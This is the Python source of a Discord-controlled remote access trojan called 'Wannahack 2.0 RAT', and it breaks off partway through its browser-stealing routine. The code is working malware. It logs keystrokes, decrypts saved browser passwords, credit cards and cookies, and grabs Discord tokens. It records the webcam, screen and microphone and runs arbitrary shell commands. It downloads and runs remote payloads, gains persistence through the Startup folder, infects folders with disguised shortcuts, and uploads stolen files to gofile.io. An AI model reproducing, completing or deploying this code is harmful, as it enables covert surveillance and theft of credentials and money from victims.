"""

    :7YPB&@J7????7J@&BPY7:
   7&@@@@@@@@@@@@@@@@@@@@&7
  Y@@@@@@@@@@@@@@@@@@@@@@@@Y
 J@@@@@@@@@@@@@@@@@@@@@@@@@@J
~@@@@@@#?^^7#@@@@#7^^?#@@@@@@~
P@@@@@@7    7@@@@7    ?@@@@@@P
&@@@@@@#?~^?#@@@@#?~~?#@@@@@@&
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
7P#@@@@G5JYPGGBBGGPYJ5G@@@@#P?
  .~JP#@Y            Y@#PJ~.

DISCORD RAT WANNAHACK?
"""

import asyncio
import base64
import ctypes
import datetime
import getpass
import json
import os
import random
import re
import shutil
import socket
import sqlite3
import subprocess
import sys
import threading
import time
import urllib
from ctypes import wintypes, c_char, c_buffer, windll, cdll, byref, POINTER, Structure
from urllib.error import HTTPError
from urllib.request import Request, urlopen

import cv2
import discord
import moviepy.video.io.VideoFileClip
import numpy as np
import psutil
import pyaudio
import pyautogui
import requests
import sounddevice as sd
from Crypto.Cipher import AES
from colorama import Fore
from discord import File
from discord.ext import commands
from pynput.keyboard import Listener
from scipy.io.wavfile import write

ratt1ngchann3l1d = 1202136082557173841
ratt1nggu1ld1d = 1202136082033164308

us3rn4me = getpass.getuser()
v1ct1m1d = us3rn4me.lower()
pid = os.getpid()
pcname = socket.gethostname()
adm1n = ctypes.windll.shell32.IsUserAnAdmin().__bool__()
processid = os.getpid()

mainfolder = f"C:\\Users\\{us3rn4me}\\APPDATA\\Roaming\\Chrome"
keylogfile = f"{mainfolder}\\k3yl0g.txt"

FULLCLIENTINFO = f"`👤` {us3rn4me}@{pcname} `🆔` ID: {v1ct1m1d} `👑` Admin: {adm1n}"
SHORTCLIENTINFO = f"{us3rn4me}@{pcname}"

USERDIR = os.getenv("USERPROFILE")
APPDATA = os.getenv("APPDATA")
LOCAL = os.getenv("LOCALAPPDATA")
TEMP = os.getenv("TEMP")

VARENVLIST = {
    "%APPDATA%": APPDATA,
    "%USERPROFILE%": USERDIR,
    "%LOCALAPPDATA%": LOCAL,
    "%TEMP%": TEMP,
    "%STARTUP%": f"{APPDATA}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
    "%MAINDIR%": mainfolder
}
bs = '\\'
ratgifurl = "https://cdn.discordapp.com/attachments/1169570134734688267/1217501334341685249/rat.gif?ex=6604417a&is=65f1cc7a&hm=5f84c602487a3ee1c7ccad1a90f779dfbe8073bfe8aac114c6595b5d8b2d7114&"

gifs = {
    'android': 'https://cdn.discordapp.com/attachments/1202136082557173841/1220021932356009994/fileanim.gif?ex=660d6cf7&is=65faf7f7&hm=5669412f7ebfd140ff9cee0b6d06b25c56ad083ff938a95c1adfd3501e68659c&',
    'pchacking': 'https://cdn.discordapp.com/attachments/1202136082557173841/1219745518708592690/fileanim.gif?ex=660c6b89&is=65f9f689&hm=449c51d4e1b65d40455fd1842a6aacd91bd28ba18ed6d630b2bb34ce7b44a0a7&',
    'earth': 'https://cdn.discordapp.com/attachments/1202136082557173841/1219665857962049576/earth1.gif?ex=660c2158&is=65f9ac58&hm=ad4f3e6e83f1215298f6217ef62d9c51f6e5cb1e15cca3470956ed9fcc677a53&',
}

helptext = """
-> !help - Shows this menu
-> !control [client] - Controls a client
-> !select [clients] - Selects several clients
-> !deselect [clients] - Dselects several clients
-> !masscontrol - Selects all clients
-> !activevictims - List of active clients
-> !id - Shows basic info about controlled target ['s]
-> !cd - Changes current working directory
-> !dir (directory) (depth) - Gets a tree of a directory
-> !cmd - Executes a cmd command
-> !run - Executes a run command
-> !screenshot - Gets a screenshot
-> !photo - Gets a photo from a webcam
-> !sendfile [file paths] - Sends files
-> !sendallfiles [source] [keywords] - Sends all files specified
-> !upload [directory] - Uploads files to a directory (attachments required)
-> !findallfiles [keywords] - Gets all file paths specified
-> !reccam [seconds] - Gets a recording from the camera
-> !recscreen [seconds] - Gets a recording of the screen
-> !recaudio [seconds] - Records audio from available sound device
-> !grabbrowsers - Gets all browser info - passwords, cookies etc.
-> !grabdiscord - Gets all discord tokens and basic account info
-> !dumpkeylog - Sends the keylog file (keylogger built in)
-> !wifi - Gets all wifi networks
-> !uacelevate - Shows an UAC prompt in attempt to get admin perms
-> !mu, !md, !mr, !ml (pixels) - Move mouse (up,down,right,left)
-> !write - Write
-> !lmb, !rmb - Self explainatory
-> !shortcut - Uses a shortcut ex. alt f4
-> !timedplay [song] [time] - Plays a song at a specified time ex. !timedplay song.mp3 15:21:37
-> !playaudio [song] - Plays a song
-> !infectfolder [path] - Infects a folder with the rat
-> !startlivemicrophone - Starts live listening to the microphone
-> !stoplivemicrophone - Stop s live listening to the microphone
"""

browserdiscordpaths = [
    [f"{APPDATA}/Opera Software/Opera GX Stable/Local Storage/leveldb"],
    [f"{APPDATA}/Opera Software/Opera Stable/Local Storage/leveldb"],
    [f"{APPDATA}/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb"],
    [f"{LOCAL}/Google/Chrome/User Data/Default/Local Storage/leveldb"],
    [f"{LOCAL}/Google/Chrome SxS/User Data/Default/Local Storage/leveldb"],
    [f"{LOCAL}/Google/Chrome Beta/User Data/Default/Local Storage/leveldb"],
    [f"{LOCAL}/Google/Chrome Dev/User Data/Default/Local Storage/leveldb"],
    [f"{LOCAL}/Google/Chrome Unstable/User Data/Default/Local Storage/leveldb"],
    [f"{LOCAL}/Google/Chrome Canary/User Data/Default/Local Storage/leveldb"],
    [f"{LOCAL}/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb"],
    [f"{LOCAL}/Vivaldi/User Data/Default/Local Storage/leveldb"],
    [f"{LOCAL}/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb"],
    [f"{LOCAL}/Yandex/YandexBrowserCanary/User Data/Default/Local Storage/leveldb"],
    [f"{LOCAL}/Yandex/YandexBrowserDeveloper/User Data/Default/Local Storage/leveldb"],
    [f"{LOCAL}/Yandex/YandexBrowserBeta/User Data/Default/Local Storage/leveldb"],
    [f"{LOCAL}/Yandex/YandexBrowserTech/User Data/Default/Local Storage/leveldb"],
    [f"{LOCAL}/Yandex/YandexBrowserSxS/User Data/Default/Local Storage/leveldb"],
    [f"{LOCAL}/Microsoft/Edge/User Data/Default/Local Storage/leveldb"]
]

discordpaths = [
    [f"{APPDATA}/Discord", "/Local Storage/leveldb"],
    [f"{APPDATA}/Lightcord", "/Local Storage/leveldb"],
    [f"{APPDATA}/discordcanary", "/Local Storage/leveldb"],
    [f"{APPDATA}/discordptb", "/Local Storage/leveldb"],
]

browsers = [
    ["avast", LOCAL + "\\AVAST Software\\Browser\\User Data", "", ""],
    ["amigo", LOCAL + "\\Amigo\\User Data", "", ""],
    ["torch", LOCAL + "\\Torch\\User Data", "", ""],
    ["kometa", LOCAL + "\\Kometa\\User Data", "", ""],
    ["orbitum", LOCAL + "\\Orbitum\\User Data", "", ""],
    ["cent-browser", LOCAL + "\\CentBrowser\\User Data", "", ""],
    ["7star", LOCAL + "\\7Star\\7Star\\User Data", "", ""],
    ["sputnik", LOCAL + "\\Sputnik\\Sputnik\\User Data", "", ""],
    ["vivaldi", LOCAL + "\\Vivaldi\\User Data", "", ""],
    ["google-chrome-sxs", LOCAL + "\\Google\\Chrome SxS\\User Data", "<:chrome:1216307581086203904>", "chrome.exe"],
    ["google-chrome", LOCAL + "\\Google\\Chrome\\User Data", "<:chrome:1216307581086203904>", "chrome.exe"],
    ["epic-privacy-browser", LOCAL + "\\Epic Privacy Browser\\User Data", "", ""],
    ["microsoft-edge", LOCAL + "\\Microsoft\\Edge\\User Data", "<:msedge:1216307575973478411>", "edge.exe"],
    ["uran", LOCAL + "\\uCozMedia\\Uran\\User Data", "", ""],
    ["yandex", LOCAL + "\\Yandex\\YandexBrowser\\User Data", "<:yandex:1216307574564192317>", "yandex.exe"],
    ["brave", LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data", "<:brave:1216307573125550131>", "brave.exe"],
    ["opera-gx", APPDATA + "\\Opera Software\\Opera GX Stable", "<:operagx:1216307579484110858>", "opera.exe"],
    ["opera", APPDATA + "\\Opera Software\\Opera Stable", "<:opera:1216307577495752764>", "opera.exe"],
    ["iridium", LOCAL + "\\Iridium\\User Data", "", ""]
]

dataqueries = {
    "login_data": {
        "query": "SELECT action_url, username_value, password_value FROM logins",
        "file": "\\Login Data",
        "columns": ["🌎 URL", "👤 Email/Login", "🔑 Password"],
        "decrypt": True,
    },
    "credit_cards": {
        "query": "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards",
        "file": "\\Web Data",
        "columns": ["📋 Name On Card", "💳 Card Number", "📆 Expires On", "📅 Added On"],
        "decrypt": True,
    },
    "cookies": {
        "query": "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies",
        "file": "\\Network\\Cookies",
        "columns": [
            "🔑 Host Key",
            "📋 Cookie Name",
            "📁 Path",
            "🍪 Cookie",
            "📆 Expires On",
        ],
        "decrypt": True,
    },
    "history": {
        "query": "SELECT url, title, last_visit_time FROM urls",
        "file": "\\History",
        "columns": ["🌎 URL", "📜 Title", "⏰ Visited Time"],
        "decrypt": False,
    },
    "downloads": {
        "query": "SELECT tab_url, target_path FROM downloads",
        "file": "\\History",
        "columns": ["🌎 Download URL", "📁 Local Path"],
        "decrypt": False,
    },
}

emojis = {
    'icons_image': '<:Discord_image:1216470364767518750>',
    'discord': '<:discord:1213228784996716654>',
    'file_explorer': '<:file_explorer:1216133051541749832>',
    'icon_upload': '<:icon_upload:1217122226684428388>',
    'icons_download': '<:icons_download:1216138779207925953>',
    'icons_file': '<:icons_file:1216133053559341137>',
    'icons_files': '<:icons_files:1216133054930751620>',
    'icons_id': '<:icons_id:1216134299817082880>',
    'icons_link': '<:icons_link:1216133056759337060>',
    'icons_ping': '<:icons_ping:1216134298227310663>',
    'mc_earth': '<:mc_earth:1217129519429713941>',
    'pink_computer': '<:pink_computer:1216135798995292210>',
    'user_icon': '<:user_icon:1217194452884394056>',
    'discordlogo': '<a:discordlogo:1217194083362013305>',
    'pchacking': '<a:hacking:1216135035233763529>',
    'mail': '<a:mail:1217194080015089694>',
    'nitro': '<a:discord_nitro:1217196596190773250>',
    'disk': '<a:disk:1217872225328300053>',
    'card': '<a:card:1217194087296536607>',
    'folder': '<a:folder:1217194860927385771>'
}


class Bot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents, help_command=None)

    async def setup_hook(self):
        await self.tree.sync(guild=discord.Object(id=ratt1nggu1ld1d))
        print(f"Synced slash commands for {self.user}.")


bot = Bot()


def setup():
    paths = [mainfolder, mainfolder + "\\music"]
    for p in paths:
        if not os.path.exists(p): os.mkdir(p)

    if os.path.exists(f"{TEMP}\\uac.txt"):
        try:
            oldpidfile = open(f"{TEMP}\\uac.txt", "r")
            oldpid = int(oldpidfile.read())
            oldpidfile.close()

            oldprocess = psutil.Process(oldpid)
            oldprocess.kill()
            os.remove(f"{TEMP}\\uac.txt")
        except psutil.NoSuchProcess as e:
            print(e)

    def internetcheck():
        if not os.path.exists(mainfolder):
            os.makedirs(mainfolder)
        try:
            requests.get("https://www.google.com")
            return True
        except requests.exceptions.ConnectionError:
            return False

    while not internetcheck():
        time.sleep(1)
        print(Fore.RED + "[INFO] NO INTERNET")

    print(Fore.GREEN + "[INFO] INTERNET CONNECTION ESTABILISHED")
    print(Fore.LIGHTWHITE_EX + "", end="")


def getscriptdir():
    if getattr(sys, 'frozen', False):
        scriptdirectory = os.path.dirname(sys.executable)
    else:
        scriptdirectory = os.path.dirname(os.path.abspath(__file__))

    return scriptdirectory


def keylogger():
    print(Fore.GREEN + "[INFO] KEYLOGGER STARTED")
    if not os.path.exists(keylogfile): open(keylogfile, 'w').close()

    def on_press(key):
        keyinterpretatons = {
            'enter': '\n',
            'backspace': '[BACKSPACE]',
            'space': ' ',
            'shift': '',
            'alt l': '',
            'ctrl': '',
            'ctrl l': '',
            'alt gr': ''
        }
        strkey = str(key).replace("Key.", "").replace("'", "").replace("_", " ")
        if strkey in keyinterpretatons.keys(): strkey = keyinterpretatons[strkey]
        f = open(keylogfile, 'a')
        f.write(strkey)
        f.close()

    with Listener(on_press=on_press) as listener:
        listener.join()


def changecurrentid(id):
    global cid
    cid = id


def unsplit(list):
    value = ""
    for s in list:
        value += s + " "
    return value


def getfileextension(path):
    return str(os.path.basename(path)).split("\\")[-1].split(".")[-1]


def getfileio(path):
    try:
        return requests.post(
            f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',
            files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except:
        return False


def getfileembed(path):
    image = ["png", "jpg", "jpeg", "webp"]
    if not os.path.exists(path): return
    embed = discord.Embed(color=0x2B2D31, title=f"`📁` {str(os.path.basename(path)).split('//')[-1]}",
                          description=
                          f"`Filesize:` `{bytestoreadable(os.path.getsize(path))}`\n"
                          f"`Creation time:` `{datetime.datetime.fromtimestamp(os.path.getctime(path)).strftime('%A, %B %d, %Y %I:%M:%S')}`\n"
                          f"`Origin:` `{path}`")
    embed.set_thumbnail(
        url=list(gifs.values())[random.randrange(0, len(gifs))])
    embed.set_footer(text=SHORTCLIENTINFO)
    embed.url = getfileio(path)
    return embed


def shortcut(key1, key2):
    pyautogui.keyDown(key2)
    time.sleep(0.4)
    pyautogui.keyDown(key1)
    time.sleep(0.4)
    pyautogui.keyUp(key2)
    pyautogui.keyUp(key1)


def bytestoreadable(size):
    conversionfactors = {
        "b": 1,
        "kb": 1024,
        "mb": 1024 * 1024,
        "gb": 1024 * 1024 * 1024,
        "tb": 1024 * 1024 * 1024 * 1024,
    }
    try:
        unit = max(unit for unit, factor in conversionfactors.items() if factor < size)
        file_size_in_unit = size / conversionfactors[unit]
        file_size_string = f"{file_size_in_unit:.2f} {unit}"
        return file_size_string
    except ValueError as e:
        return "Error"


def writetofile(content, path):
    with open(path, 'w', encoding='utf-8') as f:
        f.write(content)
        f.close()


def playaudio(path):
    subprocess.run(f"start cmd /c cd {mainfolder} & {mainfolder}/cmdmp3win.exe {path}", shell=True)


class DATA_BLOB(Structure):
    _fields_ = [("cbData", wintypes.DWORD), ("pbData", POINTER(c_char))]


def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw


def CryptUnprotectData(encrypted_bytes, entropy=b""):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(
            byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)
    ):
        return GetData(blob_out)


def getkey(path: str):
    if not os.path.exists(path):
        return

    if "os_crypt" not in open(path + "\\Local State", "r", encoding="utf-8").read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    key = CryptUnprotectData(key)
    return key


def decryptpassword(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass


def getbrowserdata(path: str, profile: str, key, type_of_data):
    db_file = f"""{path}\\{profile}{type_of_data['file']}"""
    if not os.path.exists(db_file):
        return
    result = ""
    shutil.copy(db_file, "temp_db")
    conn = sqlite3.connect("temp_db")
    cursor = conn.cursor()
    cursor.execute(type_of_data["query"])
    for row in cursor.fetchall():
        try:
            row = list(row)
            if type_of_data["decrypt"]:
                for i in range(len(row)):
                    if isinstance(row[i], bytes):
                        row[i] = decryptpassword(row[i], key)
            if type_of_data == "history":
                if row[2] != 0:
                    row[2] = convertchrometime(row[2])
                else:
                    row[2] = "0"
            check = ""
            for a, b in zip(type_of_data["columns"], row):
                check += f"{b}"
            if check != "":
                for col, val in zip(type_of_data["columns"], row):
                    result += f"║ {col}: {val}\n"
                result += f"╠══════════════════════════════════════════════════════════════════════\n"

        except PermissionError as e:
            print(e)
        except sqlite3.OperationalError as e:
            print(e)
        except ValueError as e:
            print(e)

    conn.close()
    os.remove("temp_db")
    return result


def convertchrometime(chrome_time):
    return (
            datetime(1601, 1, 1) + datetime.timedelta(microseconds=chrome_time)
    ).strftime("%d/%m/%Y %H:%M:%S")


@bot.event
async def on_ready():
    setup()
    os.chdir(USERDIR)

    process = threading.Thread(target=keylogger)
    process._running = True
    process.daemon = True
    process.start()

    await bot.get_channel(ratt1ngchann3l1d).send(f"@here `🔔` | {FULLCLIENTINFO} is online!")
    print(Fore.LIGHTWHITE_EX)


@bot.event
async def on_message(message, os=os, pyautogui=pyautogui, cv2=cv2):
    content = message.content
    if content.startswith("!"):
        args = str(message.content).split(" ")
        for i in range(len(args)):
            for env in VARENVLIST.keys():
                if args[i].find(env) != -1:
                    args[i] = args[i].replace(env, VARENVLIST[env])

        print(f"Recieved command >> {unsplit(args)}")

        if args[0] == "!control":
            changecurrentid(args[1])
            if args[1] == v1ct1m1d:
                await message.channel.send(f"`🎮` You are currently controlling {FULLCLIENTINFO}!")

        if args[0] == "!select":
            if v1ct1m1d in args[1:]:
                changecurrentid(v1ct1m1d)
                await message.channel.send(f"`🎮` You are currently controlling {FULLCLIENTINFO}!")

        if args[0] == "!deselect":
            if v1ct1m1d in args[1:]:
                changecurrentid(-1)
                await message.channel.send(f"`🚫` You succesfully stopped controlling {FULLCLIENTINFO}!")

        if args[0] == "!activevictims":
            await message.channel.send(FULLCLIENTINFO)

        if args[0] == "!masscontrol":
            changecurrentid(v1ct1m1d)
            await message.channel.send(f"`🎮` You are currently controlling {FULLCLIENTINFO}!")

        if cid == v1ct1m1d:
            if args[0] == "!help":
                writetofile(helptext, TEMP + "\helpmenu.txt")
                embed = discord.Embed(color=0x2B2D31, title="`🐀` `Wannahack 2.0 RAT`",
                                      description="<a:dance:1218524808053260348> `Huge thanks to:`\n<@830163807707201576> `- Rat developer`\n<@708923462072270931> `- Hardware hacking and rat dev.`")
                embed.set_thumbnail(url=ratgifurl)
                await message.channel.send(embed=embed)
                await message.channel.send(file=File(TEMP + "\helpmenu.txt"))

            if args[0] == "!start":
                subprocess.run(f"start {__file__}", shell=True)

            if args[0] == "!id":
                await message.channel.send(FULLCLIENTINFO)

            if args[0] == "!update":
                olddir = os.getcwd()

                zipfilelink = args[1]
                updatename = args[2]
                clearold = args[3]
                curlargs = "-ko"

                installdirectory = VARENVLIST['%USERPROFILE%'] + "\\URNGuest"

                if len(args) > 4:
                    curlargs = args[4]
                if not os.path.exists(installdirectory): os.mkdir(installdirectory)
                print(f"curl {curlargs} {installdirectory}/{updatename}.rar {zipfilelink}")
                os.system(f'curl {curlargs} {installdirectory}/{updatename}.rar "{zipfilelink}"')
                os.chdir(installdirectory)
                os.system(f"tar -xf {updatename}.rar")
                time.sleep(0.5)
                exefilepath = None
                for f in os.listdir(updatename):
                    if getfileextension(f) == "exe":
                        exefilepath = f"{installdirectory}/{updatename}/{f}"

                with open(VARENVLIST['%STARTUP%'] + f"/{updatename}.bat", "w") as startupbatch:
                    startupbatch.write(f"@echo off\nstart {exefilepath}")
                    startupbatch.close()
                os.chdir(olddir)
                os.system(f"start cmd /c start {exefilepath}")
                if clearold == 'True':
                    ratfilename = f"{__file__}"
                    print(ratfilename)
                    for path in os.listdir(VARENVLIST['%STARTUP%']):
                        if getfileextension(path) == "bat":
                            with open(f'{VARENVLIST["%STARTUP%"]}\\{path}', 'r') as f:
                                if f.read().find(ratfilename) != -1:
                                    f.close()
                                    os.remove(f'{VARENVLIST["%STARTUP%"]}\\{path}')

                    ratprocess = psutil.Process(pid)
                    ratprocess.kill()

            if args[0] == "!infectfolder":
                folder = args[1]
                fakefolder = f"{folder}\\sys"
                os.chdir(os.path.normpath(folder))

                os.system(f"mkdir {folder}\\sys & attrib +h /s /d {folder}\\sys")
                os.system(
                    f"curl -L -o {fakefolder}\\blank.ico https:\\github.com/Foliowiec/WannaHack/raw/main/blank.ico")
                os.system(
                    f"curl -L -o {folder}\\sys\\system32.bat https:\\raw.githubusercontent.com/Foliowiec/WannaHack/main/installer.bat")
                for filename in os.listdir(os.path.normpath(folder)):
                    if filename == "sys" or filename == "sys.bat":
                        continue
                    if os.path.isfile(os.path.normpath(folder + f"\\{filename}")):
                        ffcontent = f"""
@echo off
if not exist %USERPROFILE%\\URN start /min "" "{fakefolder}\\system32.bat"
"{os.path.normpath(fakefolder + "/" + filename)}"
                """
                    else:
                        ffcontent = f"""
@echo off
if not exist %USERPROFILE%\\URN start /min "" "{fakefolder}\\system32.bat"
explorer.exe "{os.path.normpath(fakefolder + '/' + filename)}"
                """

                    shutil.move(os.path.normpath(folder + f"\\{filename}"), os.path.normpath(folder + f"\\sys"))
                    with open(fakefolder + "\\" + f"{filename}'.bat", 'w') as ff:
                        ff.write(ffcontent)

                    shortcutbatchcontent = f"""
@echo off
echo Set oWS = WScript.CreateObject("WScript.Shell") > CreateShortcut.vbs
echo sLinkFile = "{folder}\\{filename}.lnk" >> CreateShortcut.vbs
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> CreateShortcut.vbs
echo oLink.TargetPath = "{fakefolder}\\{filename}'.bat" >> CreateShortcut.vbs
echo oLink.IconLocation = "{fakefolder}\\blank.ico,0" >> CreateShortcut.vbs
echo oLink.Save >> CreateShortcut.vbs
cscript CreateShortcut.vbs
del CreateShortcut.vbs
                                """

                    with open(folder + "\\" + f"sys.bat", 'w') as sysf:
                        sysf.write(shortcutbatchcontent)
                        sysf.close()

                    subprocess.run(folder + "\\" + f"sys.bat", shell=True)
                os.remove(folder + "\\" + f"sys.bat")

            if args[0] == "!cd":
                if os.path.exists(args[1]):
                    os.chdir(args[1])
                embed = discord.Embed(color=0x2B2D31,
                                      title=f"{emojis['disk']} `Current working directory changed to:`",
                                      description=f"```{os.getcwd()}```")
                embed.set_footer(text=SHORTCLIENTINFO)
                await message.channel.send(embed=embed)

            if args[0] == "!pwd":
                await message.channel.send(f"`📁 {os.getcwd()}`")
            if args[0] == "!dir":
                def getdirectory(directory, indent=0, depth=0):
                    try:
                        contents = os.listdir(directory)
                        contents.sort()
                        tree = f""
                        is_last_item = True
                        for i, item in enumerate(contents):
                            item_path = os.path.join(directory, item)
                            if os.path.isdir(item_path) and depth > 0:
                                is_last_item = i < len(contents) - 1
                                if is_last_item:
                                    tree += "   " * indent + "╟ 📁 " + item + "\n"
                                else:
                                    tree += "   " * indent + "╙ 📁 " + item + "\n"
                                subtree = getdirectory(item_path, indent=indent + 2, depth=depth - 1)
                                tree += subtree
                            elif os.path.isfile(item_path):
                                is_last_item = i < len(contents) - 1
                                if is_last_item:
                                    tree += ("   " * indent + "╟ 📄 " + item + " " + bytestoreadable(
                                        os.path.getsize(item_path)) + "\n")
                                else:
                                    tree += ("   " * indent + "╙ 📄 " + item + " " + bytestoreadable(
                                        os.path.getsize(item_path)) + "\n")
                            else:
                                continue
                        return tree
                    except PermissionError as e:
                        return ""

                if len(args) == 3:
                    directory = args[1]
                    depth = args[2]
                elif len(args) == 2:
                    directory = os.getcwd()
                    depth = args[1]
                else:
                    directory = os.getcwd()
                    depth = 3

                f = open(f"{mainfolder}\\dir.txt", "w", encoding="utf-8")
                f.write(f"DIRECTORY TREE OF {directory}\n\n" + getdirectory(directory, depth=int(depth)))
                f.close()
                await message.channel.send(file=File(f"{mainfolder}\\dir.txt"))

            if args[0] == "!cmd":
                command = unsplit(args[1:])
                subprocess.run(f"cd {os.getcwd()} & {command} >> {mainfolder}\\output.txt", shell=True,)
                time.sleep(1.5)
                embed = discord.Embed(color=0x2B2D31,
                                      description=f"`{os.getcwd()}>`\n"
                                                  f"```{command}```\n"
                                                  f"`Command output:`")
                embed.set_footer(text=SHORTCLIENTINFO)
                await message.channel.send(embed=embed)
                try:
                    await message.channel.send(file=File(f"{mainfolder}\\output.txt"))
                except discord.errors.HTTPException:
                    await message.channel.send(embed=getfileembed(f"{mainfolder}\\output.txt"))
                time.sleep(1.5)
                os.remove(f"{mainfolder}\\output.txt")

            if args[0] == "!run":
                command = args[1]

                shortcut("r", "win")
                time.sleep(0.3)
                pyautogui.write(command)
                pyautogui.sleep(0.2)
                pyautogui.press("enter")

                embed = discord.Embed(color=0x2B2D31, title=f"`Win + R >> {command}`")
                embed.set_thumbnail(
                    url=list(gifs.values())[random.randrange(0, len(gifs))])
                embed.set_footer(text=SHORTCLIENTINFO)
                await message.channel.send(embed=embed)

            if args[0] == "!timedplay":
                def gethour():
                    currenttime = urlopen("http://just-the-time.appspot.com/")
                    currentstrtime = str(currenttime.read().strip())[-9:-1]
                    currenthour = str(currentstrtime[:2])
                    utcplus1hour = str(int(currentstrtime[:2]) + 1)
                    currentstrtime = currentstrtime.replace(currenthour, utcplus1hour)
                    return currentstrtime

                path = mainfolder + "\\music\\" + args[1]

                if not os.path.exists(path) or sum(
                        [a * b for a, b in zip([3600, 60, 1], map(int, gethour().split(':')))]) > sum(
                        [a * b for a, b in zip([3600, 60, 1], map(int, args[2].split(':')))]):
                    return
                print(str(args[2]))
                while True:
                    ctime = gethour()
                    print(ctime)
                    if ctime == str(args[2]):
                        break
                await message.channel.send("`🎶 Playing file!`")
                playaudio(path)

            if args[0] == "!playaudio":
                path = mainfolder + "\\music\\" + args[1]
                if not os.path.exists(path):
                    return
                await message.channel.send("`🎶 Playing file!`")
                playaudio(path)

            if args[0] == "!screenshot" or args[0] == "!ss":
                pyautogui.screenshot().save(f"{mainfolder}\\screenshot.png")
                await message.channel.send(file=File(f"{mainfolder}\\screenshot.png"))

            if args[0] == "!photo" or args[0] == "!pp":
                camport = 0
                camera = cv2.VideoCapture(camport)
                returnvalue, image = camera.read()
                cv2.imwrite(TEMP + "\\photo.png", image)
                await message.channel.send(file=File(TEMP + "\\photo.png"))

            if args[0] == "!recaudio":
                soundpath = TEMP + "\\sound.wav"
                fs = 44100
                duration = int(args[1])
                record_voice = sd.rec(int(duration * fs), samplerate=fs, channels=2)
                sd.wait()
                write(soundpath, fs, record_voice)
                try:
                    await message.channel.send(file=File(soundpath))
                except discord.errors.HTTPException:
                    await message.channel.send(embed=getfileembed(soundpath))

            if args[0] == "!startlivemicrophone":
                class PyAudioPCM(discord.AudioSource):
                    def __init__(self, channels=2, rate=48000, chunk=960, input_device=1) -> None:
                        p = pyaudio.PyAudio()
                        self.chunks = chunk
                        self.input_stream = p.open(format=pyaudio.paInt16, channels=channels, rate=rate, input=True,
                                                   input_device_index=input_device, frames_per_buffer=chunk)

                    def read(self) -> bytes:
                        return self.input_stream.read(self.chunks)

                voicechannel = await message.author.voice.channel.connect(self_mute=False)
                voicechannel.play(PyAudioPCM())

            if args[0] == "!stoplivemicrophone":
                for voiceclient in bot.voice_clients:
                    return await voiceclient.disconnect(force=True)

            if args[0] == "!reccam":
                async def cam():
                    videopath = TEMP + "\\camrecording.mp4"

                    vidcapture = cv2.VideoCapture(0)
                    vidcod = cv2.VideoWriter_fourcc(*'XVID')
                    output = cv2.VideoWriter(videopath, vidcod, 20.0, (640, 480))
                    input2 = 0

                    while True:
                        input2 = input2 + 1
                        input3 = 0.045 * input2
                        ret, frame = vidcapture.read()
                        output.write(frame)
                        if input3 >= int(args[1]):
                            break
                        else:
                            continue
                    vidcapture.release()
                    output.release()

                    video = moviepy.video.io.VideoFileClip.VideoFileClip(videopath)
                    path = TEMP + "\\camvideo.mp4"
                    video.write_videofile(path)

                    try:
                        await message.channel.send(file=File(path))
                    except discord.errors.HTTPException:
                        await message.channel.send(embed=getfileembed(path))

                await asyncio.create_task(cam())

            if args[0] == "!recscreen":
                fps = 24.0
                recordingtime = int(args[1])
                videopath = TEMP + "\\video.avi"
                SCREEN_SIZE = tuple(pyautogui.size())

                fourcc = cv2.VideoWriter_fourcc(*"XVID")

                out = cv2.VideoWriter(videopath, fourcc, fps, SCREEN_SIZE)

                for i in range(int(recordingtime * fps)):
                    img = pyautogui.screenshot()
                    frame = np.array(img)
                    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                    out.write(frame)

                cv2.destroyAllWindows()
                out.release()

                video = moviepy.video.io.VideoFileClip.VideoFileClip(videopath)
                path = videopath.replace(".avi", ".mp4")
                video.write_videofile(path)

                try:
                    await message.channel.send(file=File(path))
                except discord.errors.HTTPException:
                    await message.channel.send(embed=getfileembed(path))

            if args[0] == "!dumpkeylog":
                if not os.path.exists(keylogfile): return
                await message.channel.send(embed=getfileembed(keylogfile))
                os.remove(keylogfile)

            if args[0] == "!grabbrowsers":
                def installedbrowsers():
                    return [x for x in browsers if os.path.exists(f"{x[1]}\\Local State")]

                info = {
                    "login_data": [f"{mainfolder}\\p4ssw0rds.txt", "`🔑 Passwords`"],
                    "credit_cards": [f"{mainfolder}\\cr3d1tc4rds.txt", "`💳 Credit Cards`"],
                    "history": [f"{mainfolder}\\h1st0ry.txt", "`📜 History`"],
                    "cookies": [f"{mainfolder}\\c0okies.txt", "`🍪 Cookies`"],
                    "downloads": [f"{mainfolder}\\d0wnloads.txt", "`💾 Downloads`"],
                }

                for p in info.values():
                    if os.path.exists(p[0]):
                        os.remove(p[0])
                for browser in installedbrowsers():
                    os.system(f"taskkill /f /im {browser[3]}")
                    path = browser[1]
                    key = getkey(path)

                    for data_type_name, data_type in dataqueries.items():
